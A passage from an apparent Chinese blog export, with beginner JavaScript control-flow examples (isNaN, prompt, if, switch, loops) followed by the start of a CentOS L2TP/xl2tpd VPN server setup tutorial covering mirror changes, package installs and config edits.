<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\u2620&quot;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;font-size: 200px;&quot;</span>&gt;</span>&amp;#9760<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230129200707329.png" alt="image-20230129200707329"></p>
<h3 id="isNaN-—使用该函数判断是不是NaN"><a href="#isNaN-—使用该函数判断是不是NaN" class="headerlink" title="isNaN()—使用该函数判断是不是NaN"></a>isNaN()—使用该函数判断是不是NaN</h3><p><strong>如果是NaN，则返回true</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> a = <span class="title class_">NaN</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">isNaN</span>(a));</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230129203436249.png" alt="image-20230129203436249"></p>
<h3 id="prompt-—接收键盘输入"><a href="#prompt-—接收键盘输入" class="headerlink" title="prompt()—接收键盘输入"></a>prompt()—接收键盘输入</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> a = <span class="title function_">prompt</span>(<span class="string">&quot;输入你的年龄：&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="title function_">alert</span>(a);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230130185410670.png" alt="image-20230130185410670"></p>
<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230130185422027.png" alt="image-20230130185422027"></p>
<h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> a = <span class="title function_">prompt</span>(<span class="string">&quot;输入你的成绩：&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">if</span>(a == <span class="number">100</span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="title function_">alert</span>(<span class="string">&quot;奖励宝马一辆&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a &gt;= <span class="number">80</span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="title function_">alert</span>(<span class="string">&quot;奖励一台手机&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a &gt;= <span class="number">60</span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="title function_">alert</span>(<span class="string">&quot;奖励十年模拟，三年高考试卷100套&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;<span class="keyword">else</span>&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="title function_">alert</span>(<span class="string">&quot;奖励棍子打断！！！&quot;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230130193948675.png" alt="image-20230130193948675"></p>
<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230130193957418.png" alt="image-20230130193957418"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> a = <span class="title function_">prompt</span>(<span class="string">&quot;输入你的成绩：&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">if</span>(a &gt; <span class="number">100</span> || a &lt; <span class="number">0</span> || <span class="built_in">isNaN</span>(a))&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="title function_">alert</span>(<span class="string">&quot;拖出去毙了！！！&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;<span class="keyword">else</span>&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="keyword">if</span>(a == <span class="number">100</span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="title function_">alert</span>(<span class="string">&quot;奖励宝马一辆&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a &gt;= <span class="number">80</span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="title function_">alert</span>(<span class="string">&quot;奖励一台手机&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a &gt;= <span class="number">60</span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="title function_">alert</span>(<span class="string">&quot;奖励十年模拟，三年高考试卷100套&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;<span class="keyword">else</span>&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="title function_">alert</span>(<span class="string">&quot;奖励棍子打断！！！&quot;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> </span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230130194424865.png" alt="image-20230130194424865"></p>
<h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;&lt;/title&gt;</span><br><span class="line">        &lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">            var a = Number(prompt(<span class="string">&quot;输入1-3其中之一的数字：&quot;</span>));</span><br><span class="line">            switch(a)&#123;</span><br><span class="line">                <span class="keyword">case</span> 1:</span><br><span class="line">                    console.log(<span class="string">&quot;壹&quot;</span>);</span><br><span class="line">                    <span class="built_in">break</span>;</span><br><span class="line">                <span class="keyword">case</span> 2:</span><br><span class="line">                    console.log(<span class="string">&quot;贰&quot;</span>);</span><br><span class="line">                    <span class="built_in">break</span>;</span><br><span class="line">                <span class="keyword">case</span> 3:</span><br><span class="line">                    console.log(<span class="string">&quot;叁&quot;</span>);</span><br><span class="line">                    <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230130213105881.png" alt="image-20230130213105881"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;&lt;/title&gt;</span><br><span class="line">        &lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">            var a = Number(prompt(<span class="string">&quot;输入你的成绩0~100：&quot;</span>));</span><br><span class="line">            switch(parseInt(a/10))&#123;</span><br><span class="line">                <span class="keyword">case</span> 10:</span><br><span class="line">                <span class="keyword">case</span> 9:</span><br><span class="line">                <span class="keyword">case</span> 8:</span><br><span class="line">                <span class="keyword">case</span> 7:</span><br><span class="line">                <span class="keyword">case</span> 6:</span><br><span class="line">                    console.log(<span class="string">&quot;合格&quot;</span>);</span><br><span class="line">                    <span class="built_in">break</span>;</span><br><span class="line">                default:</span><br><span class="line">                    console.log(<span class="string">&quot;不合格&quot;</span>);</span><br><span class="line">                    <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230130221606311.png" alt="image-20230130221606311"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;&lt;/title&gt;</span><br><span class="line">        &lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">            var a = Number(prompt(<span class="string">&quot;输入你的成绩0~100：&quot;</span>));</span><br><span class="line">            switch(<span class="literal">true</span>)&#123;</span><br><span class="line">                <span class="keyword">case</span> a &gt;= 60:</span><br><span class="line">                    console.log(<span class="string">&quot;合格&quot;</span>);</span><br><span class="line">                    <span class="built_in">break</span>;</span><br><span class="line">                default:</span><br><span class="line">                    console.log(<span class="string">&quot;不合格&quot;</span>);</span><br><span class="line">                    <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230130221811910.png" alt="image-20230130221811910"></p>
<h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> a = <span class="number">1</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">while</span>(a &lt;= <span class="number">10</span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="variable language_">document</span>.<span class="title function_">write</span>(a++ +<span class="string">&quot;&lt;/br/&gt;&quot;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230201001654609.png" alt="image-20230201001654609"></p>
<h3 id="do…while"><a href="#do…while" class="headerlink" title="do…while"></a>do…while</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> a = <span class="number">1</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">do</span>&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                <span class="variable language_">document</span>.<span class="title function_">write</span>(a++ +<span class="string">&quot;&lt;br/&gt;&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;<span class="keyword">while</span>(a &lt;= <span class="number">10</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/27/JavaScript%E5%85%A5%E9%97%A8/image-20230201002041684.png" alt="image-20230201002041684"></p>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>Javascript</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>L2TP</title>
    <url>/2022/12/09/L2TP/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="L2TP"><a href="#L2TP" class="headerlink" title="L2TP"></a>L2TP</h1><p>全程注意！！！不要把我的注释弄进配置里面，绝对会报错！！！</p>
<p>L2TP通俗的说就是一种VPN隧道技术。</p>
<p>VPN就是一种网络穿透技术，可以让你链接到一处网络，同时本身的流量限制就会失效变成链接处的网络规则所以如果你在<strong>外网服务器上搭建</strong>后连接上去，你的网络就可以变成没有国内限制，可以自由的访问外网。但是<strong>在国际上搭建VPN是犯法的</strong>，本章节教授的技术也无指导国际上搭建VPN的内容，仅内网网段实验可用。</p>
<h2 id="检测服务器"><a href="#检测服务器" class="headerlink" title="检测服务器"></a>检测服务器</h2><p>查看系统是否支持PPP</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">modprobe ppp-compress-18 &amp;&amp; <span class="built_in">echo</span> <span class="built_in">yes</span></span><br></pre></td></tr></table></figure>

<p>检查是否开启了TUN</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /dev/net/tun</span><br></pre></td></tr></table></figure>

<p>有的虚拟机主机需要开启，返回结果为cat: &#x2F;dev&#x2F;net&#x2F;tun: File descriptor in bad state(cat: &#x2F;dev&#x2F;net&#x2F;tun: 文件描述符处于错误状态),就表示通过。</p>
<h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><h3 id="更换yum源"><a href="#更换yum源" class="headerlink" title="更换yum源"></a>更换yum源</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -f /var/run/yum.pid</span><br><span class="line"></span><br><span class="line">yum install -y wget</span><br><span class="line"></span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line"></span><br><span class="line">yum clean all &amp;&amp; yum makecache</span><br></pre></td></tr></table></figure>

<h3 id="安装epel源"><a href="#安装epel源" class="headerlink" title="安装epel源"></a>安装epel源</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y epel-release</span><br></pre></td></tr></table></figure>

<h2 id="安装必要程序"><a href="#安装必要程序" class="headerlink" title="安装必要程序"></a>安装必要程序</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y make gcc gmp-devel xmlto bison flex xmlto libpcap-devel lsof vim vim-enhanced man xl2tpd libreswan</span><br></pre></td></tr></table></figure>

<h2 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h2><h3 id="options-xl2tpd"><a href="#options-xl2tpd" class="headerlink" title="options.xl2tpd"></a>options.xl2tpd</h3><p><strong>编辑编辑&#x2F;etc&#x2F;ppp&#x2F;options.xl2tpd</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/ppp/options.xl2tpd</span><br><span class="line">require-mschap-v2</span><br><span class="line">ms-dns 8.8.8.8</span><br><span class="line">ms-dns 8.8.4.4</span><br><span class="line">auth</span><br><span class="line">mtu 1200</span><br><span class="line">mru 1000</span><br><span class="line">crtscts</span><br><span class="line">hide-password</span><br><span class="line">modem</span><br><span class="line">name l2tpd</span><br><span class="line">proxyarp</span><br><span class="line">lcp-echo-interval 30</span><br><span class="line">lcp-echo-failure 10</span><br></pre></td></tr></table></figure>

<h3 id="xl2tpd-conf"><a href="#xl2tpd-conf" class="headerlink" title="xl2tpd.conf"></a>xl2tpd.conf</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/xl2tpd/xl2tpd.conf</span><br><span class="line">; This is a minimal sample xl2tpd configuration file <span class="keyword">for</span> use</span><br><span class="line">; with L2TP over IPsec.</span><br><span class="line">;</span><br><span class="line">; The idea is to provide an L2TP daemon to <span class="built_in">which</span> remote Windows L2TP/IPsec</span><br><span class="line">; clients connect. In this example, the internal (protected) network </span><br><span class="line">; is 192.168.1.0/24.  A special IP range within this network is reserved</span><br><span class="line">; <span class="keyword">for</span> the remote clients: 192.168.1.128/25</span><br><span class="line">; (i.e. 192.168.1.128 ... 192.168.1.254)</span><br><span class="line">;</span><br><span class="line">; The listen-addr parameter can be used <span class="keyword">if</span> you want to <span class="built_in">bind</span> the L2TP daemon</span><br><span class="line">; to a specific IP address instead of to all interfaces. For instance,</span><br><span class="line">; you could <span class="built_in">bind</span> it to the interface of the internal LAN (e.g. 192.168.1.98</span><br><span class="line">; <span class="keyword">in</span> the example below). Yet another IP address (<span class="built_in">local</span> ip, e.g. 192.168.1.99)</span><br><span class="line">; will be used by xl2tpd as its address on pppX interfaces.</span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line"><span class="comment"># 这个去掉listen-addr前面的注释，后面写上自己的网卡ip</span></span><br><span class="line">listen-addr = 192.168.241.130</span><br><span class="line">;</span><br><span class="line">; requires openswan-2.5.18 or higher - Also does not yet work <span class="keyword">in</span> combination</span><br><span class="line">; with kernel mode l2tp as present <span class="keyword">in</span> linux 2.6.23+</span><br><span class="line">ipsec saref = <span class="built_in">yes</span> <span class="comment">#去掉注释</span></span><br><span class="line">; Use refinfo of 22 <span class="keyword">if</span> using an SAref kernel patch based on openswan 2.6.35 or</span><br><span class="line">;  when using any of the SAref kernel patches <span class="keyword">for</span> kernels up to 2.6.35.</span><br><span class="line">; saref refinfo = 30</span><br><span class="line">;</span><br><span class="line">; force userspace = <span class="built_in">yes</span></span><br><span class="line">;</span><br><span class="line">; debug tunnel = <span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line">[lns default]</span><br><span class="line"><span class="comment"># ip range 分配给VPN客户端的IP，这个可以随便用，但是后面对应的local ip要改，然后防火墙也要改</span></span><br><span class="line">ip range = 192.168.2.2-192.168.2.20</span><br><span class="line"><span class="built_in">local</span> ip = 192.168.2.1</span><br><span class="line">require chap = <span class="built_in">yes</span></span><br><span class="line">refuse pap = <span class="built_in">yes</span></span><br><span class="line">require authentication = <span class="built_in">yes</span></span><br><span class="line">name = LinuxVPNserver</span><br><span class="line">ppp debug = <span class="built_in">yes</span></span><br><span class="line">pppoptfile = /etc/ppp/options.xl2tpd</span><br><span class="line">length bit = <span class="built_in">yes</span></span><br></pre></td></tr></table></figure>

<h3 id="编辑内核参数"><a href="#编辑内核参数" class="headerlink" title="编辑内核参数"></a>编辑内核参数</h3><p>修改&#x2F;etc&#x2F;sysctl.conf</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net.ipv4.ip_forward = 1</span><br><span class="line">net.ipv4.conf.all.accept_redirects = 0</span><br><span class="line">net.ipv4.conf.all.rp_filter = 0</span><br><span class="line">net.ipv4.conf.all.send_redirects = 0</span><br><span class="line">net.ipv4.conf.default.accept_redirects = 0</span><br><span class="line">net.ipv4.conf.default.rp_filter = 0</span><br><span class="line">net.ipv4.conf.default.send_redirects = 0</span><br><span class="line">net.ipv4.conf.ens33.accept_redirects = 0 <span class="comment">#注意这里网卡名称ens33，如果你的网卡不是这个名字的话请注意修改！！！</span></span><br><span class="line">net.ipv4.conf.ens33.rp_filter = 0 <span class="comment">#注意这里网卡名称ens33，如果你的网卡不是这个名字的话请注意修改！！！</span></span><br><span class="line">net.ipv4.conf.ens33.send_redirects = 0 <span class="comment">#注意这里网卡名称ens33，如果你的网卡不是这个名字的话请注意修改！！！</span></span><br><span class="line">net.ipv4.conf.lo.accept_redirects = 0</span><br><span class="line">net.ipv4.conf.lo.rp_filter = 0</span><br><span class="line">net.ipv4.conf.lo.send_redirects = 0</span><br></pre></td></tr></table></figure>

<p>加载内核参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sysctl -p</span><br></pre></td></tr></table></figure>

